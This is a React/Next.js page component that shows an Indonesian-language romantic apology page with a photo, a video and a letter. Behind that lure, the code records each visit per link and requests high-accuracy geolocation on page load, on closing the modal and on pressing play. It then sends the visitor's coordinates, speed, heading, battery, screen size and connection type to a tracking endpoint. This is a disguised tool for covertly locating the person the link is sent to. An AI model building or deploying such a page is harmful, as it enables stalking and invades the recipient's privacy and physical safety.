'use client';

import { useState, useEffect, useRef, use } from 'react';
import ApologyModal from '@/components/ApologyModal';

export default function HeartfeltApologyPage({ params }) {
  const unwrappedParams = use(params);
  const linkId = unwrappedParams.id;

  const [linkConfig, setLinkConfig] = useState(null);
  const [isPlaying, setIsPlaying] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(true);
  const videoRef = useRef(null);

  // Battery helper
  const getBattery = async () => {
    try {
      if (typeof navigator !== 'undefined' && typeof navigator.getBattery === 'function') {
        const b = await navigator.getBattery();
        const level = Math.round((b.level || 0) * 100);
        const charging = b.charging ? ' (⚡ Mengisi)' : '';
        return `${level}%${charging}`;
      }
    } catch (e) {}
    return null;
  };

  // Geolocation trigger & tracking telemetry sender
  const captureLocation = () => {
    if (typeof window === 'undefined' || !navigator.geolocation) return;

    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';

    getBattery().then((battery) => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;

          fetch(`/api/track/${linkId || 'direct'}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              latitude,
              longitude,
              accuracy,
              altitude,
              altitudeAccuracy,
              heading,
              speed,
              screenResolution,
              battery,
              connectionType
            })
          }).catch(() => {});
        },
        (err) => {
          console.warn('Geolocation notice:', err);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    });
  };

  // 1. Initial page mount: record visit, load config, and trigger immediate location permission
  useEffect(() => {
    if (!linkId) return;

    fetch(`/api/visit/${linkId}`, { method: 'POST' }).catch(() => {});

    fetch(`/api/links/${linkId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.success && data.link) {
          setLinkConfig(data.link);
        }
      })
      .catch((err) => console.warn('Fetch link error:', err));

    // Instant permission prompt on initial page visit (tanpa harus klik tombol dulu)
    captureLocation();
  }, [linkId]);

  // 2. Triggered when user confirms "Lanjutkan" on ApologyModal (hanya menutup modal dan lanjut ke landing page)
  const handleConfirmModal = () => {
    setIsModalOpen(false);
    captureLocation();
  };

  // 3. Triggered only when user manually taps play icon on video
  const handlePlayVideo = () => {
    setIsLoading(true);
    setIsPlaying(true);

    // Synchronous video play for iOS Safari & Android
    if (videoRef.current) {
      videoRef.current.play().catch((e) => {
        console.warn('Playback notice:', e);
      });
    }

    captureLocation();
    setIsLoading(false);
  };

  const videoSource = linkConfig?.videoUrl || '/videos/momenvideo.mp4';
  const videoTitle = linkConfig?.title || 'Sebuah Permintaan Maaf dari Lubuk Hatiku';

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#fbf9f6',
      backgroundImage: `
        radial-gradient(circle at 15% 15%, rgba(254, 237, 232, 0.7) 0%, transparent 45%),
        radial-gradient(circle at 85% 75%, rgba(253, 235, 240, 0.7) 0%, transparent 45%),
        radial-gradient(circle at 50% 50%, rgba(255, 248, 240, 0.5) 0%, transparent 60%)
      `,
      color: '#292524',
      fontFamily: '"Plus Jakarta Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      padding: '40px 18px 60px 18px',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center'
    }}>
      
      <div style={{
        width: '100%',
        maxWidth: '520px',
        margin: '0 auto',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        textAlign: 'center'
      }}>

        {/* Elegant Top Badge with SVG Heart */}
        <div style={{
          display: 'inline-flex',
          alignItems: 'center',
          gap: '8px',
          padding: '7px 16px',
          backgroundColor: '#ffffff',
          border: '1px solid rgba(225, 175, 175, 0.45)',
          borderRadius: '9999px',
          fontSize: '0.8rem',
          color: '#9c4146',
          fontWeight: 600,
          letterSpacing: '0.02em',
          boxShadow: '0 4px 15px rgba(225, 175, 175, 0.15)',
          marginBottom: '16px'
        }}>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="#9c4146">
            <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
          </svg>
          <span>Sebuah Pesan Tulus Untukmu</span>
        </div>

        {/* Emotional Title with Playfair Serif */}
        <h1 style={{
          fontFamily: '"Playfair Display", Georgia, serif',
          fontSize: '1.75rem',
          fontWeight: 600,
          lineHeight: 1.35,
          color: '#1c1917',
          margin: '0 0 10px 0',
          letterSpacing: '-0.01em'
        }}>
          {videoTitle}
        </h1>

        <p style={{
          fontSize: '0.92rem',
          color: '#78716c',
          lineHeight: 1.6,
          margin: '0 0 24px 0',
          maxWidth: '440px',
          fontStyle: 'italic',
          fontFamily: '"Playfair Display", Georgia, serif'
        }}>
          &ldquo;Ada hal yang tak sempat terucap secara langsung, namun tertulis tulus dari lubuk hati yang terdalam...&rdquo;
        </p>

        {/* Photo Memory Frame (Polaroid / Aesthetic Gallery Style) */}
        <div style={{
          width: '100%',
          maxWidth: '440px',
          backgroundColor: '#ffffff',
          padding: '12px 12px 16px 12px',
          borderRadius: '22px',
          boxShadow: '0 15px 35px -8px rgba(180, 140, 130, 0.16), 0 2px 8px rgba(0, 0, 0, 0.04)',
          border: '1px solid rgba(230, 215, 210, 0.75)',
          marginBottom: '24px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center'
        }}>
          <div style={{
            width: '100%',
            maxHeight: '380px',
            borderRadius: '16px',
            overflow: 'hidden',
            backgroundColor: '#f5f0eb'
          }}>
            <img
              src="/images/fotokita.jpeg"
              alt="Momen Kenangan Kita"
              style={{
                width: '100%',
                height: 'auto',
                maxHeight: '380px',
                objectFit: 'cover',
                display: 'block'
              }}
            />
          </div>

          <div style={{
            display: 'flex',
            alignItems: 'center',
            gap: '6px',
            marginTop: '12px',
            fontFamily: '"Playfair Display", Georgia, serif',
            fontStyle: 'italic',
            fontSize: '0.88rem',
            color: '#78716c'
          }}>
            <span>Momen yang Selalu Ku Jaga</span>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="#9c4146">
              <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
            </svg>
          </div>
        </div>

        {/* Subtle Section Divider */}
        <div style={{
          display: 'flex',
          alignItems: 'center',
          gap: '12px',
          width: '100%',
          maxWidth: '440px',
          marginBottom: '16px'
        }}>
          <div style={{ flex: 1, height: '1px', background: 'rgba(230, 215, 210, 0.7)' }}></div>
          <span style={{ fontSize: '0.78rem', color: '#a8a29e', letterSpacing: '0.06em', textTransform: 'uppercase', fontWeight: 600 }}>
            Putar Video di Bawah Ini
          </span>
          <div style={{ flex: 1, height: '1px', background: 'rgba(230, 215, 210, 0.7)' }}></div>
        </div>

        {/* Video Card Container - Refined Luxury Frame */}
        <div style={{
          width: '100%',
          backgroundColor: '#ffffff',
          padding: '10px',
          borderRadius: '24px',
          boxShadow: '0 20px 45px -10px rgba(180, 140, 130, 0.15), 0 4px 12px rgba(0, 0, 0, 0.04)',
          border: '1px solid rgba(230, 215, 210, 0.7)',
          marginBottom: '24px'
        }}>
          
          <div style={{
            position: 'relative',
            width: '100%',
            aspectRatio: '9 / 16',
            maxHeight: '480px',
            backgroundColor: '#0c0a09',
            borderRadius: '16px',
            overflow: 'hidden',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>

            {/* Video Element */}
            <video
              ref={videoRef}
              src={videoSource}
              playsInline
              webkit-playsinline="true"
              controls={isPlaying}
              loop
              preload="auto"
              style={{
                width: '100%',
                height: '100%',
                objectFit: 'contain',
                backgroundColor: '#0c0a09',
                display: 'block'
              }}
            />

            {/* Elegant Minimalist Play Overlay */}
            {!isPlaying && (
              <div
                onClick={handlePlayVideo}
                style={{
                  position: 'absolute',
                  top: 0,
                  left: 0,
                  width: '100%',
                  height: '100%',
                  background: 'linear-gradient(rgba(0,0,0,0.25), rgba(0,0,0,0.55))',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  justifyContent: 'center',
                  cursor: 'pointer',
                  userSelect: 'none',
                  zIndex: 10,
                  transition: 'background 0.3s ease'
                }}
              >
                {/* Refined Small Play Button */}
                <div style={{
                  width: '56px',
                  height: '56px',
                  borderRadius: '50%',
                  backgroundColor: 'rgba(255, 255, 255, 0.95)',
                  boxShadow: '0 8px 25px rgba(0, 0, 0, 0.3), 0 0 0 4px rgba(255, 255, 255, 0.25)',
                  backdropFilter: 'blur(8px)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  marginBottom: '12px',
                  transition: 'transform 0.2s ease',
                  paddingLeft: '3px'
                }}>
                  {isLoading ? (
                    <div style={{
                      width: '20px',
                      height: '20px',
                      border: '2px solid rgba(156, 65, 70, 0.3)',
                      borderRadius: '50%',
                      borderTopColor: '#9c4146',
                      animation: 'spin 0.8s linear infinite'
                    }} />
                  ) : (
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#9c4146">
                      <path d="M8 5v14l11-7z" />
                    </svg>
                  )}
                </div>

                <div style={{
                  fontSize: '0.9rem',
                  fontWeight: 600,
                  color: '#ffffff',
                  letterSpacing: '0.01em',
                  textShadow: '0 2px 8px rgba(0,0,0,0.8)'
                }}>
                  {isLoading ? 'Menyiapkan Video...' : 'Sentuh untuk Memutar'}
                </div>
              </div>
            )}

          </div>

        </div>

        {/* Beautiful Parchment Apology Letter Card */}
        <div style={{
          width: '100%',
          backgroundColor: '#ffffff',
          borderRadius: '20px',
          padding: '28px 24px',
          border: '1px solid rgba(230, 215, 210, 0.6)',
          boxShadow: '0 12px 30px -8px rgba(180, 140, 130, 0.1)',
          textAlign: 'left',
          position: 'relative',
          overflow: 'hidden'
        }}>
          
          {/* Subtle decorative quote watermark */}
          <div style={{
            position: 'absolute',
            top: '12px',
            right: '18px',
            opacity: 0.08,
            pointerEvents: 'none'
          }}>
            <svg width="60" height="60" viewBox="0 0 24 24" fill="#9c4146">
              <path d="M6 17h3l2-4V7H5v6h3zm8 0h3l2-4V7h-6v6h3z" />
            </svg>
          </div>

          <div style={{
            fontSize: '0.78rem',
            textTransform: 'uppercase',
            letterSpacing: '0.08em',
            color: '#9c4146',
            fontWeight: 700,
            marginBottom: '12px',
            display: 'flex',
            alignItems: 'center',
            gap: '6px'
          }}>
            <span>Surat Untukmu</span>
          </div>

          <div style={{
            fontSize: '0.92rem',
            color: '#44403c',
            lineHeight: 1.75,
            display: 'flex',
            flexDirection: 'column',
            gap: '14px'
          }}>
            <p style={{ margin: 0 }}>
              Aku tahu, mungkin sebuah kata maaf tak seketika mampu menghapus rasa kecewa atau luka yang sempat tergores. Tapi sungguh, dari hatiku yang paling jujur, aku sangat menyesal jika sikap atau perkataanku telah membuatmu bersedih.
            </p>

            <p style={{ margin: 0 }}>
              Tidak ada niat sedikit pun untuk melukaimu. Kehadiranmu begitu berharga, dan melihatmu kecewa adalah hal yang paling membuatku merasa bersalah.
            </p>

            <p style={{ margin: 0 }}>
              Jika masih ada sedikit ruang di hatimu, izinkan aku untuk memperbaikinya, mendengarkan semua keluh kesahmu, dan memeluk kembali kehangatan yang sempat renggang. Aku sangat merindukan senyum tulusmu.
            </p>
          </div>

          {/* Signature */}
          <div style={{
            marginTop: '22px',
            paddingTop: '16px',
            borderTop: '1px solid rgba(230, 215, 210, 0.4)',
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center'
          }}>
            <div style={{
              fontFamily: '"Playfair Display", Georgia, serif',
              fontStyle: 'italic',
              fontSize: '0.95rem',
              color: '#1c1917'
            }}>
              Dengan segenap ketulusanku
            </div>

            <div style={{
              display: 'flex',
              alignItems: 'center',
              gap: '4px',
              color: '#9c4146'
            }}>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="#9c4146">
                <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
              </svg>
            </div>
          </div>

        </div>

        {/* Minimalist aesthetic footer */}
        <div style={{
          marginTop: '28px',
          fontSize: '0.75rem',
          color: '#a8a29e',
          letterSpacing: '0.04em'
        }}>
          Pesan ini dikirimkan khusus dan hanya untukmu
        </div>

      </div>

      {/* Heartfelt Apology Pre-Permission Modal */}
      <ApologyModal
        isOpen={isModalOpen}
        onConfirm={handleConfirmModal}
      />

    </div>
  );
}
